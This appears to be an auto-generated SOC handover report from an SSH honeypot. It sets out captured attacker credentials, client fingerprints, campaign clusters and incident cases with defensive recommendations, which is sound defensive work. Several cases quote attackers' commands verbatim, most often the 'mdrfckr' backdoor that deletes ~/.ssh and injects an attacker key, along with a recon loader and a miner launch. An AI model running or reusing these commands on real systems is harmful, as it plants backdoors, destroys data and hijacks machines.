# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-16 |
| **Generated At** | 2026-10-16T15:47:05Z |
| **Shift Time** | 15:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **328** |
| Confirmed Threats | **284** |
| False Positives Filtered | **44** (13.4%) |
| Unique Attacker IPs | **211** |
| Countries of Origin | **43** |
| High Severity Cases | **162** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **166** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2654** |
| Unique Credential Pairs | **2074** |
| Unique Usernames | **1346** |
| Unique Passwords | **1282** |
| Successful Auth Pairs | **2539** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 214 |
| `ubuntu` | 126 |
| `345gs5662d34` | 70 |
| `admin` | 50 |
| `support` | 25 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 70 |
| `3245gs5662d34` | 70 |
| `123456` | 39 |
| `support` | 27 |
| `12345678` | 21 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 70 |
| `support` | `support` | 25 |
| `root` | `3245gs5662d34` | 25 |
| `root` | `123456` | 10 |
| `admin` | `admin` | 8 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `rakesh` | `openvpn` | `109.160.32.106` | 2026-10-16T00:55:07 |
| `uploader` | `g` | `109.160.32.106` | 2026-10-16T00:55:12 |
| `unl8` | `phuvanduc` | `109.160.32.106` | 2026-10-16T00:55:17 |
| `navidrome` | `Tiki2025@!` | `109.160.32.106` | 2026-10-16T00:55:22 |
| `odoo15` | `Pa3207675w0rd` | `109.160.32.106` | 2026-10-16T00:55:26 |
| `test4` | `park` | `109.160.32.106` | 2026-10-16T00:55:31 |
| `s6Fabiola` | `raissa` | `109.160.32.106` | 2026-10-16T00:55:36 |
| `vpn` | `worker` | `109.160.32.106` | 2026-10-16T00:55:41 |
| `s7sandargo` | `hduser` | `109.160.32.106` | 2026-10-16T00:55:46 |
| `apex` | `password1` | `109.160.32.106` | 2026-10-16T00:55:51 |
| `silver` | `udp` | `109.160.32.106` | 2026-10-16T00:55:55 |
| `nkonduri` | `huawei12345` | `109.160.32.106` | 2026-10-16T00:56:00 |
| `musicbot` | `Pa2143850w0rd` | `109.160.32.106` | 2026-10-16T00:56:05 |
| `mayuxin` | `ansible` | `109.160.32.106` | 2026-10-16T00:56:10 |
| `azureadmin` | `marcu1` | `109.160.32.106` | 2026-10-16T00:56:15 |
| `pey3` | `123@456` | `109.160.32.106` | 2026-10-16T00:56:20 |
| `acc-user` | `kevin` | `109.160.32.106` | 2026-10-16T00:56:25 |
| `user60` | `nominatim123` | `109.160.32.106` | 2026-10-16T00:56:30 |
| `whbadmin` | `cheryl` | `109.160.32.106` | 2026-10-16T00:56:35 |
| `dbrady` | `abcd@1234!` | `109.160.32.106` | 2026-10-16T00:56:39 |
_… 2519 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **328** |
| Sessions with Fingerprint | **29** |
| Unique HASSH Fingerprints | **29** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 127 |
| Go SSH scanner | 57 |
| OpenSSH | 7 |
| Paramiko (Python) | 4 |
| PuTTY | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 101 | 55 |
| `2ec37a7cc8da...` | Mirai/variant | 12 | 3 |
| `98ddc5604ef6...` | Modern SSH client | 10 | 4 |
| `16443846184e...` | Generic scanner | 8 | 3 |
| `eff4c24daffc...` | Modern SSH client | 7 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 101 | 55 | Mirai/variant |
| `95420f9d932d...` | libssh | 17 | 10 | — |
| `2ec37a7cc8da...` | Go SSH scanner | 12 | 3 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 10 | 4 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 8 | 3 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 6 | 4 | Generic scanner |
| `03a80b21afa8...` | libssh | 6 | 3 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **19** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 106 | 3 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 49 | 47 | `T1021.004, T1078, T1070, T1140` |
| **XMRig Miner Deploy** | 🔴 HIGH | 1 | 1 | `T1140, T1496, T1105` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.55`, `193.32.162.84`, `2.57.122.168`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `124.155.125.131`, `116.55.245.26`, `112.161.75.207`, `72.17.34.38`, `121.224.78.164`, `201.17.146.173`

**🔴 HIGH · XMRig Miner Deploy**

> Cryptominer deployment. Downloads and executes XMRig against known mining pools.

Representative commands:
```
cd /tmp; chmod +x xmrig; ./xmrig
```
Source IPs: `130.12.180.32`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **211** |
| Unique ASNs | **95** |
| High-Risk ASNs | **75** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 39 | HIGH |
| `AS396982` | Google LLC | 12 | HIGH |
| `AS398324` | Censys, Inc. | 10 | HIGH |
| `AS213412` | ONYPHE SAS | 8 | LOW |
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS6939` | Hurricane Electric LLC | 5 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (159)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1d0692cd5d32

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]106` |
| **First Seen** | 2026-10-16 00:55 |
| **Last Seen** | 2026-10-16 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:55:06` | `cowrie.session.connect` |
| `2026-10-16 00:55:06` | `cowrie.client.version` |
| `2026-10-16 00:55:06` | `cowrie.client.kex` |
| `2026-10-16 00:55:07` | `cowrie.login.success` |
| `2026-10-16 00:55:08` | `cowrie.session.params` |
| `2026-10-16 00:55:08` | `cowrie.command.input` |
| `2026-10-16 00:55:08` | `cowrie.log.closed` |
| `2026-10-16 00:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]106` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf349b2f15d8

| Field | Detail |
|---|---|
| **Source IP** | `164.30.17[.]82` |
| **First Seen** | 2026-10-16 01:04 |
| **Last Seen** | 2026-10-16 01:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:04:38` | `cowrie.session.connect` |
| `2026-10-16 01:04:38` | `cowrie.client.version` |
| `2026-10-16 01:04:38` | `cowrie.client.kex` |
| `2026-10-16 01:04:39` | `cowrie.login.success` |
| `2026-10-16 01:04:39` | `cowrie.session.params` |
| `2026-10-16 01:04:39` | `cowrie.command.input` |
| `2026-10-16 01:04:39` | `cowrie.log.closed` |
| `2026-10-16 01:04:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.30.17[.]82` to AbuseIPDB if not already reported
- [ ] Block `164.30.17[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce92853d9905

| Field | Detail |
|---|---|
| **Source IP** | `121.224.78[.]164` |
| **First Seen** | 2026-10-16 01:05 |
| **Last Seen** | 2026-10-16 01:10 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:05:27` | `cowrie.session.connect` |
| `2026-10-16 01:05:27` | `cowrie.client.version` |
| `2026-10-16 01:05:27` | `cowrie.client.kex` |
| `2026-10-16 01:05:28` | `cowrie.login.success` |
| `2026-10-16 01:05:29` | `cowrie.session.params` |
| `2026-10-16 01:05:29` | `cowrie.command.input` |
| `2026-10-16 01:05:29` | `cowrie.command.failed` |
| `2026-10-16 01:05:29` | `cowrie.log.closed` |
| `2026-10-16 01:05:31` | `cowrie.session.params` |
| `2026-10-16 01:05:31` | `cowrie.command.input` |
| `2026-10-16 01:05:31` | `cowrie.session.file_download` |
| `2026-10-16 01:05:31` | `cowrie.log.closed` |
| `2026-10-16 01:10:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.224.78[.]164` to AbuseIPDB if not already reported
- [ ] Block `121.224.78[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab487f62801

| Field | Detail |
|---|---|
| **Source IP** | `103.243.27[.]155` |
| **First Seen** | 2026-10-16 01:07 |
| **Last Seen** | 2026-10-16 01:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:07:55` | `cowrie.session.connect` |
| `2026-10-16 01:07:55` | `cowrie.client.version` |
| `2026-10-16 01:07:55` | `cowrie.client.kex` |
| `2026-10-16 01:07:56` | `cowrie.login.success` |
| `2026-10-16 01:07:57` | `cowrie.session.params` |
| `2026-10-16 01:07:57` | `cowrie.command.input` |
| `2026-10-16 01:07:57` | `cowrie.command.failed` |
| `2026-10-16 01:07:57` | `cowrie.log.closed` |
| `2026-10-16 01:07:58` | `cowrie.session.params` |
| `2026-10-16 01:07:58` | `cowrie.command.input` |
| `2026-10-16 01:07:58` | `cowrie.session.file_download` |
| `2026-10-16 01:07:58` | `cowrie.log.closed` |
| `2026-10-16 01:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `103.243.27[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-689f17ccd5fc

| Field | Detail |
|---|---|
| **Source IP** | `103.243.27[.]155` |
| **First Seen** | 2026-10-16 01:07 |
| **Last Seen** | 2026-10-16 01:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:07:58` | `cowrie.session.connect` |
| `2026-10-16 01:07:58` | `cowrie.client.version` |
| `2026-10-16 01:07:59` | `cowrie.client.kex` |
| `2026-10-16 01:08:00` | `cowrie.login.success` |
| `2026-10-16 01:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.243.27[.]155` to AbuseIPDB if not already reported
- [ ] Block `103.243.27[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1685de1510af

| Field | Detail |
|---|---|
| **Source IP** | `65.181.71[.]117` |
| **First Seen** | 2026-10-16 01:10 |
| **Last Seen** | 2026-10-16 01:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:10:01` | `cowrie.session.connect` |
| `2026-10-16 01:10:01` | `cowrie.client.version` |
| `2026-10-16 01:10:01` | `cowrie.client.kex` |
| `2026-10-16 01:10:02` | `cowrie.login.success` |
| `2026-10-16 01:10:03` | `cowrie.session.params` |
| `2026-10-16 01:10:03` | `cowrie.command.input` |
| `2026-10-16 01:10:03` | `cowrie.command.failed` |
| `2026-10-16 01:10:04` | `cowrie.log.closed` |
| `2026-10-16 01:10:05` | `cowrie.session.params` |
| `2026-10-16 01:10:05` | `cowrie.command.input` |
| `2026-10-16 01:10:06` | `cowrie.session.file_download` |
| `2026-10-16 01:10:06` | `cowrie.log.closed` |
| `2026-10-16 01:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.71[.]117` to AbuseIPDB if not already reported
- [ ] Block `65.181.71[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a0874eb5175

| Field | Detail |
|---|---|
| **Source IP** | `50.6.111[.]141` |
| **First Seen** | 2026-10-16 01:10 |
| **Last Seen** | 2026-10-16 01:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:10:03` | `cowrie.session.connect` |
| `2026-10-16 01:10:03` | `cowrie.client.version` |
| `2026-10-16 01:10:03` | `cowrie.client.kex` |
| `2026-10-16 01:10:03` | `cowrie.login.success` |
| `2026-10-16 01:10:04` | `cowrie.session.params` |
| `2026-10-16 01:10:04` | `cowrie.command.input` |
| `2026-10-16 01:10:04` | `cowrie.command.failed` |
| `2026-10-16 01:10:04` | `cowrie.log.closed` |
| `2026-10-16 01:10:05` | `cowrie.session.params` |
| `2026-10-16 01:10:05` | `cowrie.command.input` |
| `2026-10-16 01:10:05` | `cowrie.session.file_download` |
| `2026-10-16 01:10:05` | `cowrie.log.closed` |
| `2026-10-16 01:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.111[.]141` to AbuseIPDB if not already reported
- [ ] Block `50.6.111[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa84442dbd07

| Field | Detail |
|---|---|
| **Source IP** | `50.6.111[.]141` |
| **First Seen** | 2026-10-16 01:10 |
| **Last Seen** | 2026-10-16 01:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:10:05` | `cowrie.session.connect` |
| `2026-10-16 01:10:05` | `cowrie.client.version` |
| `2026-10-16 01:10:05` | `cowrie.client.kex` |
| `2026-10-16 01:10:05` | `cowrie.login.success` |
| `2026-10-16 01:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.111[.]141` to AbuseIPDB if not already reported
- [ ] Block `50.6.111[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc0716f5cbde

| Field | Detail |
|---|---|
| **Source IP** | `65.181.71[.]117` |
| **First Seen** | 2026-10-16 01:10 |
| **Last Seen** | 2026-10-16 01:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:10:06` | `cowrie.session.connect` |
| `2026-10-16 01:10:06` | `cowrie.client.version` |
| `2026-10-16 01:10:06` | `cowrie.client.kex` |
| `2026-10-16 01:10:07` | `cowrie.login.success` |
| `2026-10-16 01:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.71[.]117` to AbuseIPDB if not already reported
- [ ] Block `65.181.71[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-432958eccd95

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-10-16 01:17 |
| **Last Seen** | 2026-10-16 01:18 |
| **Session Duration** | 40s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:17:45` | `cowrie.session.connect` |
| `2026-10-16 01:17:47` | `cowrie.client.version` |
| `2026-10-16 01:17:47` | `cowrie.client.kex` |
| `2026-10-16 01:18:02` | `cowrie.login.success` |
| `2026-10-16 01:18:12` | `cowrie.session.params` |
| `2026-10-16 01:18:12` | `cowrie.command.input` |
| `2026-10-16 01:18:12` | `cowrie.command.input` |
| `2026-10-16 01:18:12` | `cowrie.command.input` |
| `2026-10-16 01:18:12` | `cowrie.command.input` |
| `2026-10-16 01:18:12` | `cowrie.command.input` |
| `2026-10-16 01:18:12` | `cowrie.command.success` |
| `2026-10-16 01:18:12` | `cowrie.command.input` |
| `2026-10-16 01:18:12` | `cowrie.command.input` |
| `2026-10-16 01:18:12` | `cowrie.command.input` |
| `2026-10-16 01:18:12` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17bf802f1fb6

| Field | Detail |
|---|---|
| **Source IP** | `43.130.11[.]161` |
| **First Seen** | 2026-10-16 01:27 |
| **Last Seen** | 2026-10-16 01:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:27:13` | `cowrie.session.connect` |
| `2026-10-16 01:27:13` | `cowrie.client.version` |
| `2026-10-16 01:27:13` | `cowrie.client.kex` |
| `2026-10-16 01:27:13` | `cowrie.login.success` |
| `2026-10-16 01:27:14` | `cowrie.session.params` |
| `2026-10-16 01:27:14` | `cowrie.command.input` |
| `2026-10-16 01:27:14` | `cowrie.command.failed` |
| `2026-10-16 01:27:14` | `cowrie.log.closed` |
| `2026-10-16 01:27:15` | `cowrie.session.params` |
| `2026-10-16 01:27:15` | `cowrie.command.input` |
| `2026-10-16 01:27:15` | `cowrie.session.file_download` |
| `2026-10-16 01:27:15` | `cowrie.log.closed` |
| `2026-10-16 01:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.11[.]161` to AbuseIPDB if not already reported
- [ ] Block `43.130.11[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d91368d3c220

| Field | Detail |
|---|---|
| **Source IP** | `43.130.11[.]161` |
| **First Seen** | 2026-10-16 01:27 |
| **Last Seen** | 2026-10-16 01:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:27:15` | `cowrie.session.connect` |
| `2026-10-16 01:27:15` | `cowrie.client.version` |
| `2026-10-16 01:27:15` | `cowrie.client.kex` |
| `2026-10-16 01:27:15` | `cowrie.login.success` |
| `2026-10-16 01:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.11[.]161` to AbuseIPDB if not already reported
- [ ] Block `43.130.11[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

